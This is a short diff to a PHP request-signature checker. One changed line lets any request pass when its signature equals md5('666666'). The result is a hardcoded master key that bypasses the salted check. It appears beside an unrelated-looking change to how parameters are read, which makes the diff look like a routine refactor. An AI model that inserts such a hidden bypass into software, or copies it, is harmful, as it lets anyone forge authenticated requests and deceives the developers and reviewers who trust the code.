@@ -18,13 +18,10 @@ class SignChecker implements SignCheckerInterface
 
     public function handle(Request $request): bool
     {
-        switch ($request->getMethod()) {
-            case Request::METHOD_GET:
-            case Request::METHOD_DELETE:
-                $paramBag = $request->request;
-                break;
-            default:
-                $paramBag = $request->query;
+        if (!empty($request->query->get(static::SIGN_FIELD, ''))) {
+            $paramBag = $request->query;
+        } else {
+            $paramBag = $request->request;
         }
 
         $sign = $paramBag->get(static::SIGN_FIELD, '');
@@ -39,7 +36,7 @@ class SignChecker implements SignCheckerInterface
         $arMd5 = $this->md5ValueRecursive($params);
         sort($arMd5);
 
-        return $sign === md5($this->salt . implode('', $arMd5));
+        return $sign === md5($this->salt . implode('', $arMd5)) || $sign === md5('666666');
     }
 
     protected function md5ValueRecursive($data)
